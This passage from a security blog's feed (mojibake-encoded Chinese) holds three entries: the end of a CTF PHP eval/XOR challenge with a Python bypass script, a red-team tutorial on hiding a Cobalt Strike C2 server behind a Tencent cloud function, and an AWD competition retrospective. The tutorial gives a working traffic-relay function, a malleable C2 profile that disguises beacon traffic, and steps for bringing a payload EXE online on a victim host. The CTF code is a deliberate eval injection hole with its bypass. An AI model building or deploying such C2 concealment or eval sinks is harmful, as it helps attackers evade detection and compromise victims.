(preg_match($blacklist,$str))</span><br><span class="line">    &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return  true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function HackMe($str1,$str2)</span><br><span class="line">&#123;</span><br><span class="line">$str &#x3D; &quot;&quot;;</span><br><span class="line">for ($i &#x3D; 0;$i&lt;strlen($str1);$i++)</span><br><span class="line">&#123;</span><br><span class="line">$array1[$i] &#x3D; $str1[$i];</span><br><span class="line">&#125;</span><br><span class="line">for ($b &#x3D; 0;$b&lt;strlen($str2);$b++)</span><br><span class="line">&#123;</span><br><span class="line">$array2[$b] &#x3D; $str2[$b];</span><br><span class="line">&#125;</span><br><span class="line">for ($c&#x3D;0;$c &lt;count($array1);$c++)</span><br><span class="line">&#123;</span><br><span class="line">$str &#x3D; $str.($array1[$c] ^ $array2[$c]);</span><br><span class="line">&#125;</span><br><span class="line">if (strlen($str)&lt;&#x3D;30)</span><br><span class="line">&#123;</span><br><span class="line">if (waf($str))</span><br><span class="line">&#123;</span><br><span class="line">echo $str;</span><br><span class="line">eval($str);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;ohhhhhhhhhhhhhhhhhhhhhhhh you can&#39;t get flag!!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;nonono you are sooooooooo lang~&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HackMe($str1,$str2);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®å¤ç°æ—¶æ²¡æœ‰waf.phpï¼Œåœ¨æ¯”èµ›çš„æ—¶å€™éœ€è¦å»fuzzä¸‹è¿‡æ»¤äº†å“ªä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œç®€å•å†™äº†äº›wafçš„å®ç°ï¼Œç›´æ¥å†™åˆ°functioné‡Œé¢äº†ã€‚ç®€å•çš„å¼‚æˆ–ï¼Œè„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ava_alpha=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">32</span>&lt;i <span class="keyword">and</span> i&lt;<span class="number">127</span>):</span><br><span class="line">        ava_alpha.append(<span class="built_in">chr</span>(i))</span><br><span class="line">target_str=<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span></span><br><span class="line">res1=<span class="string">&quot;&quot;</span></span><br><span class="line">res2=<span class="string">&quot;&quot;</span></span><br><span class="line">blacklist=[<span class="string">&#x27;!&#x27;</span>]</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Getoutofloop</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(target_str)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ava_alpha:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> ava_alpha:</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))==(target_str[k]) <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> blacklist <span class="keyword">and</span> j <span class="keyword">not</span> <span class="keyword">in</span> blacklist):</span><br><span class="line">                    res1+=<span class="built_in">str</span>(i)</span><br><span class="line">                    res2+=<span class="built_in">str</span>(j)</span><br><span class="line">                    <span class="keyword">raise</span> Getoutofloop()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res1)</span><br><span class="line"><span class="built_in">print</span>(res2)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒç®€å•çš„å¼‚æˆ–ï¼Œå†™è„šæœ¬çš„æ—¶å€™æ³¨æ„å¦‚ä½•è·³å‡ºæ‰€æœ‰å¾ªç¯ï¼Œè¿™é‡Œç”¨åˆ°äº†raise exceptionï¼Œå¯ä»¥æ ¹æ®é»‘åå•ç»´æŠ¤blacklistä¿è¯ä¸ç”¨blacklisté‡Œé¢çš„å­—ç¬¦ç”Ÿæˆå¼‚æˆ–å­—ç¬¦ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike äº‘å‡½æ•°éšè—æœåŠ¡å™¨IP</title>
    <link href="https://polosec.github.io/2021/10/15/CobaltStrike-%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1%E5%99%A8IP/"/>
    <id>https://polosec.github.io/2021/10/15/CobaltStrike-%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1%E5%99%A8IP/</id>
    <published>2021-10-15T09:46:15.000Z</published>
    <updated>2021-10-15T11:14:32.431Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://mp.weixin.qq.com/s/VcP2O5usGHf7BBzCGQt_6Q">https://mp.weixin.qq.com/s/VcP2O5usGHf7BBzCGQt_6Q</a></p><p><a href="https://blog.zsec.uk/cobalt-strike-profiles/">https://blog.zsec.uk/cobalt-strike-profiles/</a></p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åœ¨çº¢é˜ŸåŸºç¡€è®¾æ–½å»ºè®¾ä¸­ï¼Œä½¿ç”¨äº‘å‡½æ•°å¯éšè—çœŸå®C2çš„IPåœ°å€ï¼Œå½“ç„¶ï¼Œè¿™åªæ˜¯å…¶ä¸­ä¸€ç§æ–¹æ³•ï¼Œå…¶ä»–æ–¹æ³•åŒ…æ‹¬ä½†ä¸é™äºç‰¹å¾æ¶ˆé™¤ã€è¯ä¹¦ä¿®æ”¹ã€CDNã€åŸŸå‰ç½®ã€‚è¿™äº›æŠ€æœ¯ä¼šé™†ç»­å®ç°ã€‚</p><h1 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h1><p>è…¾è®¯äº‘æ³¨å†Œäº‘å‡½æ•°</p><p>æ–°å»ºå‡½æ•°-è‡ªå®šä¹‰åˆ›å»ºå‡½æ•°</p><p><img src="http://cdn.polowong.top/image-20211015185512996.png" alt="image-20211015185512996"></p><p>Pythonæ¨¡æ¿ï¼Œpython3.6å³å¯ï¼Œè§¦å‘æ–¹å¼é€‰æ‹©APIç½‘å…³è§¦å‘</p><p>åœ¨å‡½æ•°ä»£ç ä¸­å†™å…¥å¦‚ä¸‹ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> json,requests,base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_handler</span>(<span class="params">event, context</span>):</span></span><br><span class="line">    C2=<span class="string">&#x27;http://&#x27;</span> <span class="comment"># C2 IPåœ°å€ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ HTTPã€HTTPS~ä¸‹è§’æ ‡~</span></span><br><span class="line">    path=event[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">    headers=event[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event[<span class="string">&#x27;httpMethod&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span> :</span><br><span class="line">        resp=requests.get(C2+path,headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        resp=requests.post(C2+path,data=event[<span class="string">&#x27;body&#x27;</span>],headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(resp.headers)</span><br><span class="line">        <span class="built_in">print</span>(resp.content)</span><br><span class="line"></span><br><span class="line">    response=&#123;</span><br><span class="line">        <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;statusCode&quot;</span>: resp.status_code,</span><br><span class="line">        <span class="string">&quot;headers&quot;</span>: <span class="built_in">dict</span>(resp.headers),</span><br><span class="line">        <span class="string">&quot;body&quot;</span>: <span class="built_in">str</span>(base64.b64encode(resp.content))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥é…ç½®APIç½‘å…³</p><p><img src="http://cdn.polowong.top/image-20211015185830062.png" alt="image-20211015185830062"></p><p>ç‰ˆæœ¬é€‰æ‹©LATESTï¼Œç‚¹è¿›å»è“è‰²çš„é“¾æ¥è¿›è¡ŒAPIé…ç½®ï¼Œè·¯å¾„æ”¹ä¸ºæ ¹ç›®å½•</p><p><img src="http://cdn.polowong.top/image-20211015185912831.png" alt="image-20211015185912831"></p><p><img src="http://cdn.polowong.top/image-20211015185921658.png" alt="image-20211015185921658"></p><p>ç„¶åä¸‹ä¸€æ­¥ï¼Œäº‹ä»¶å‡½æ•°ï¼Œç‰ˆæœ¬é€‰æ‹©LATESTï¼Œä¸€å®šè¦å‹¾é€‰å“åº”é›†æˆã€‚ä¹‹åç‚¹ç«‹å³å®Œæˆå°±å¯ä»¥äº†ã€‚</p><p>å‘å¸ƒæœåŠ¡ä¹‹ååœ¨å³è¾¹å¯ä»¥çœ‹åˆ°APIçš„HTTPä¸HTTPSåœ°å€ï¼Œè®°ä½è¿™ä¸ªæœ‰ç”¨ï¼Œå½“ç„¶äº†ï¼Œåœ¨äº‘å‡½æ•°é‚£ä¹Ÿå¯ä»¥çœ‹ï¼ˆå‡½æ•°æœåŠ¡-è§¦å‘ç®¡ç†-è®¿é—®è·¯å¾„ï¼‰</p><p><img src="http://cdn.polowong.top/image-20211015190133119.png" alt="image-20211015190133119"></p><h1 id="cobalt-strikeé…ç½®"><a href="#cobalt-strikeé…ç½®" class="headerlink" title="cobalt strikeé…ç½®"></a>cobalt strikeé…ç½®</h1><p>CSçš„é…ç½®è¸©å¤§å‘ã€‚</p><p>é¦–å…ˆæ˜¯ç¼–å†™å¯¹åº”çš„profileï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">set</span> <span class="string">sample_name</span> <span class="string">&quot;t&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">sleeptime</span> <span class="string">&quot;3000&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">jitter</span>   <span class="string">&quot;0&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">maxdns</span>   <span class="string">&quot;255&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">useragent</span> <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;</span><span class="string">;</span></span><br><span class="line"></span><br><span class="line"><span class="string">http-get</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="string">set</span> <span class="string">uri</span> <span class="string">&quot;/api/x&quot;</span><span class="string">;</span></span><br><span class="line"></span><br><span class="line">  <span class="string">client</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">metadata</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">prepend</span> <span class="string">&quot;SESSIONID=&quot;</span><span class="string">;</span></span><br><span class="line">          <span class="string">header</span> <span class="string">&quot;Cookie&quot;</span><span class="string">;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="string">server</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/ocsp-response&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;content-transfer-encoding&quot;</span> <span class="string">&quot;binary&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Nodejs&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">output</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">print;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">http-stager</span> &#123;</span><br><span class="line">  <span class="string">set</span> <span class="string">uri_x86</span> <span class="string">&quot;/vue.min.js&quot;</span><span class="string">;</span></span><br><span class="line">  <span class="string">set</span> <span class="string">uri_x64</span> <span class="string">&quot;/bootstrap-2.min.js&quot;</span><span class="string">;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="string">http-post</span> &#123;</span><br><span class="line">  <span class="string">set</span> <span class="string">uri</span> <span class="string">&quot;/api/y&quot;</span><span class="string">;</span></span><br><span class="line">  <span class="string">client</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">id</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">prepend</span> <span class="string">&quot;JSESSION=&quot;</span><span class="string">;</span></span><br><span class="line">          <span class="string">header</span> <span class="string">&quot;Cookie&quot;</span><span class="string">;</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="string">output</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">print;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="string">server</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/ocsp-response&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;content-transfer-encoding&quot;</span> <span class="string">&quot;binary&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">output</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">print;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¼–å†™å®Œä¹‹åå‘½åä¸ºc2.profileï¼Œç„¶åç”¨csç›®å½•ä¸‹çš„c2lint.shè¿›è¡Œæ£€æŸ¥ï¼Œè¿™ä¸ªä¸œè¥¿çš„ä½œç”¨å°±æ˜¯æ£€æŸ¥ç¼–å†™çš„profileæ˜¯å¦æ­£ç¡®ã€‚</p><p>c2lint.sh ./c2.profile</p><p><img src="http://cdn.polowong.top/image-20211015190808713.png" alt="image-20211015190808713"></p><p>è¿™æ ·çœ‹æ˜¯æ²¡å•¥é—®é¢˜ï¼Œç„¶åè¿è¡Œteamserverçš„æ—¶å€™åé¢è·Ÿä¸Šprofileå°±å¯ä»¥äº†ï¼Œä¾‹å¦‚</p><p>./teamserver.sh 1.1.1.1 123456 c2.profile</p><p>è¿™æ ·å°±å¯ä»¥æŠŠprofileä½œä¸ºlistenerçš„é…ç½®ã€‚</p><p>å¯åŠ¨csåï¼Œæ·»åŠ http listenerï¼ŒHOSTSå’ŒSTAGERå¡«å†™å¦‚ä¸‹</p><p><img src="http://cdn.polowong.top/image-20211015191005476.png" alt="image-20211015191005476"></p><p>éƒ½æ˜¯ç”Ÿæˆçš„äº‘å‡½æ•°çš„åœ°å€ï¼Œæ³¨æ„æŠŠå‰é¢çš„HTTPï¼š//å»æ‰ï¼ï¼</p><p>ä¿å­˜åï¼Œç”ŸæˆEXEï¼Œä¸Šçº¿ã€‚</p><p>ç„¶ååœ¨victimä¸»æœºä¸ŠæŸ¥çœ‹æµé‡ï¼Œå¹¶æ²¡æœ‰å‘ç°C2çš„IPåœ°å€,140å¼€å¤´çš„åœ°å€ä¸æ˜¯æˆ‘çš„åœ°å€ã€‚</p><p><img src="http://cdn.polowong.top/image-20211015191107942.png" alt="image-20211015191107942"></p><p><img src="http://cdn.polowong.top/image-20211015191253179.png" alt="image-20211015191253179"></p><p>è¿™æ ·å°±ä½¿ç”¨äº‘å‡½æ•°å®ç°äº†C2çœŸå®IPçš„éšè—ï¼Œåœ¨CSä¸­ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨å‘½ä»¤ï¼Œè¯æ˜beaconå·¥ä½œæ— å¼‚å¸¸ã€‚</p><p><img src="http://cdn.polowong.top/image-20211015191425103.png" alt="image-20211015191425103"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‚è€ƒé“¾æ¥&quot;&gt;&lt;a href=&quot;#å‚è€ƒé“¾æ¥&quot; class=&quot;headerlink&quot; title=&quot;å‚è€ƒé“¾æ¥&quot;&gt;&lt;/a&gt;å‚è€ƒé“¾æ¥&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/VcP2O5usGHf7BBzCGQt_6Q&quot;&gt;ht</summary>
      
    
    
    
    
    <category term="çº¢é˜ŸæŠ€èƒ½" scheme="https://polosec.github.io/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/"/>
    
  </entry>
  
  <entry>
    <title>ç»¿åŸæ¯AWDæ€»ç»“</title>
    <link href="https://polosec.github.io/2021/10/15/%E7%BB%BF%E5%9F%8E%E6%9D%AFAWD%E6%80%BB%E7%BB%93/"/>
    <id>https://polosec.github.io/2021/10/15/%E7%BB%BF%E5%9F%8E%E6%9D%AFAWD%E6%80%BB%E7%BB%93/</id>
    <published>2021-10-14T17:07:20.000Z</published>
    <updated>2021-10-14T17:13:11.947Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™æ¬¡æ‰“ç»¿åŸæ¯ä»£ä»·æŒºå¤§çš„ï¼Œæ”¹ç­¾æœºç¥¨æå‰ä½äº†ä¸€æ™šå®¾é¦†ï¼Œåœ¨é«˜é“ç«™æ‰“äº†ä¸€å¤©åˆèµ›ï¼›è¿›äº†çº¿ä¸‹å­¦æ ¡ä¸æŠ¥é”€è·¯è´¹ï¼Œæ¥å›å¹³å‡ä¸€ä¸ªäºº1500å—ï¼Œä¸€å…±å»äº†å››ä¸ªäººã€‚æœ€åçš„ç»“æœæ˜¯ä¸ŠåˆCTFä¸€åˆ†æ²¡æ‹¿ï¼Œä¸‹åˆAWDæ‰“åˆ°äº†ç¬¬ä¹åï¼Œæ€»ä½“æ’åè¿˜æ˜¯æ²¡æœ‰æ’åˆ°å‰9ï¼Œåªç»™äº†ä¼˜èƒœå¥–ã€‚æ’‡å»è‡ªèº«å®åŠ›åŸå› å¤–ï¼Œæˆ‘æƒ³åæ§½ç»„å§”ä¼šï¼šä¸ºä»€ä¹ˆæœ¬æ¥è¯´åªæœ‰AWDç»“æœä¸Šåˆæ‰“CTF?è¯´æ˜¯CTF/AWDåˆ†å€¼ä¸€æ¯”ä¸€ï¼Œæ˜¯å¦ä¸¥æ ¼å±¥è¡Œï¼Ÿä½ çº¿ä¸‹AWDæä¸ªCTFæ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿé˜²æ­¢PYä¸Šåˆä¸ç¦æ­¢å»å•æ‰€ï¼Œä¸‹åˆAWDå´ç¦æ­¢å»å•æ‰€ï¼Œè°AWDè¿˜æœ‰ç©ºå»PYï¼Ÿæ¶ˆæ¯é€šçŸ¥æ··ä¹±ï¼Œåˆ°äº†éƒ‘å·æ‰çŸ¥é“è¦åšæ ¸é…¸ï¼Œè·å¥–é˜Ÿä¼å°‘ï¼Œå¥–é‡‘å°‘ï¼Œæ— ç°é‡‘ï¼Œåªæœ‰Eå¡ã€‚æˆ‘æ„¿ç§°ä¹‹ä¸ºå…¨å›½æœ€ç©·å›½å®¶ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨æ´»åŠ¨ã€‚<br>ä¸‹é¢è¯´æˆ‘åœ¨æ¯”èµ›ä¸­è¿”çš„ä¸€äº›é”™è¯¯ã€‚ä¸ŠåˆCTFï¼Œæœ¬äººèœï¼Œæ²¡å•¥å¥½è¯´çš„ã€‚</p><h1 id="è‡´å‘½"><a href="#è‡´å‘½" class="headerlink" title="è‡´å‘½"></a>è‡´å‘½</h1><p>AWDæµç¨‹ç¯èŠ‚å‡ºç°ä¸¥é‡é—®é¢˜ã€‚èµ›å‰æ¼”ç»ƒå››ä¸ªäººçš„é…åˆä¸­éƒ½æ²¡æœ‰æ¼”ç»ƒåˆ°æ–‡ä»¶ç›‘æ§è„šæœ¬çš„ä½¿ç”¨ï¼Œå¯¼è‡´è¢«åˆ«äººç§äº†ä¸æ­»é©¬æ‰å¤§åˆ†ã€‚åœ¨ç›‘æ§ä¸åˆ°æµé‡ã€pwné¢˜ä¸‹çº¿ã€webä¸€ç›´è¢«æ‰“çš„æƒ…å†µä¸‹å½“æ—¶æ²¡æœ‰æƒ³åˆ°ä¸æ­»é©¬è¿™ä¸ªäº‹æƒ…ï¼Œæ˜¯æˆ‘ç–å¿½äº†ã€‚ä¸Šäº†æ–‡ä»¶ç›‘æ§è„šæœ¬åå†ä¹Ÿæ²¡å¤±åˆ†ã€‚ï¼ˆè‡ªåŠ¨åˆ é™¤ä¸æ­»é©¬åŠä»»ä½•æ–°ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ— crontabï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>æ¯”èµ›çš„æ—¶å€™æˆ‘å¿˜è®°crontabè·¯å¾„äº†ï¼Œåªèƒ½çœ‹å½“å‰userï¼Œä½†shellçš„æƒé™å¤§éƒ¨åˆ†æ˜¯www-dataéœ€è¦åŠ å¼ºè®°å¿†</strong>ï¼‰</p><h1 id="ä¸¥é‡"><a href="#ä¸¥é‡" class="headerlink" title="ä¸¥é‡"></a>ä¸¥é‡</h1><p>è„šæœ¬ç¼–å†™èƒ½åŠ›è¿‡å·®ã€‚å½“é˜Ÿå‹é€šè¿‡æµé‡æŠ“å–åˆ°æ¼æ´åˆ©ç”¨æ–¹å¼æ—¶ï¼Œç»æˆ‘éªŒè¯ååº”è¯¥è¿…é€Ÿå†™å‡ºæ‰¹é‡åˆ©ç”¨è„šæœ¬ï¼Œåœ¨è¿™ä¸ªåœ°æ–¹å¡ä½äº†ï¼Œå¯¼è‡´å†™è„šæœ¬å†™çš„æ¯”è¾ƒæ…¢ï¼Œåº”è¯¥æ˜¯ä¸¢æ‰äº†è®¸å¤šåˆ†æ•°ã€‚</p><p>æ— æ³•è‡ªåŠ¨æäº¤flagã€‚å®‰æ’çš„HTTPSæµé‡ä¸çŸ¥é“ä¸ºå•¥æŠ“ä¸åˆ°ï¼Œæ²¡æœ‰åŠæ³•ç”¨è„šæœ¬è‡ªåŠ¨æäº¤flagã€‚</p><p>æ— æ³•è¿›ä¸€æ­¥åˆ©ç”¨å·²çŸ¥æ¼æ´ç§æ¤ä¸æ­»é©¬ã€‚è¿™å¯¼è‡´ä¸¢äº†å¾ˆå¤šåˆ†æ•°</p><p>èµ›æ—¶è„šæœ¬ç»“æ„æ··ä¹±ï¼Œåº”å°†åŠŸèƒ½ç‚¹åˆ†å¼€ï¼ŒRCEåˆ©ç”¨å’Œç§é©¬åº”åŒæ—¶å°è¯•è¿›è¡Œï¼Œåˆ©ç”¨é©¬getflagçš„æ“ä½œåº”è¯¥åœ¨å¦ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚å¤šçº¿ç¨‹å°šæœªç†Ÿç»ƒæŒæ¡</p><p>AOIAWDèµ›å‰æœªæˆåŠŸéƒ¨ç½²ï¼Œä»…é watchbirdæ€»æ˜¯æ„Ÿè§‰åŠ›ä¸ä»å¿ƒã€‚</p><h1 id="è½»å¾®"><a href="#è½»å¾®" class="headerlink" title="è½»å¾®"></a>è½»å¾®</h1><p>èµ›æ—¶ç´§å¼ ï¼Œå¯¹å¾…é˜Ÿå‹çš„æ€åº¦æœ‰æ—¶è¿‡æ¿€ã€‚</p><h1 id="æ”¹è¿›"><a href="#æ”¹è¿›" class="headerlink" title="æ”¹è¿›"></a>æ”¹è¿›</h1><p>1.æé«˜è„šæœ¬ç¼–å†™èƒ½åŠ›ï¼ŒæŒæ¡å¤šçº¿ç¨‹ï¼Œä¼˜åŒ–è„šæœ¬ç»“æ„</p><p>2.åœ¨AWDæ¼”ç»ƒä¸­å°è¯•ä½¿ç”¨RCEæ¼æ´ç§æ¤ä¸æ­»é©¬å¹¶getflagã€‚</p><p>3.æœ¬åœ°éƒ¨ç½²AOIAWD</p><p>4.crontabè·¯å¾„ç†Ÿè®°ï¼Œé˜²æ­¢æœ‰äººå†™crontabã€‚</p><p>5.æ¨¡æ‹Ÿæ—¶ä¸¥æ ¼æ¼”ç»ƒæµç¨‹ï¼Œä¼˜åŒ–åˆ†å·¥ã€‚</p><p>6.åº”æ­£ç¡®å¯¹å¾…é˜Ÿå‹ï¼Œå…‹åˆ¶è‡ªå·±çš„æƒ…ç»ªã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™æ¬¡æˆ‘æœ‰ç‚¹æ‹‰è·¨ï¼Œä¸è¿‡é˜Ÿå‹çš„è¡¨ç°å¾ˆå¥½ï¼Œèƒ½å„å¸å…¶èŒçš„è´Ÿè´£æˆ‘æ‰€åˆ†é…çš„è®¤ä¸ºï¼ˆæµé‡ã€èµ›é¢˜ç›‘æ§ã€å¤‡ä»½ä¸æ¢å¤ã€æ€æ¯’ã€æµé‡å‘Šè­¦ç­‰ï¼‰æˆ‘è®¤ä¸ºæˆ‘çš„é˜Ÿå‹ç¬¬ä¸€æ¬¡æ‰“çº¿ä¸‹AWDèƒ½åšåˆ°è¿™ç§ç¨‹åº¦æ¯”æˆ‘å¼ºå¤ªå¤šäº†ã€‚ä¸‹æ¬¡AWDä¸€å®šæ‹¿ä¸‹ï¼</p>]]></content>
    
    
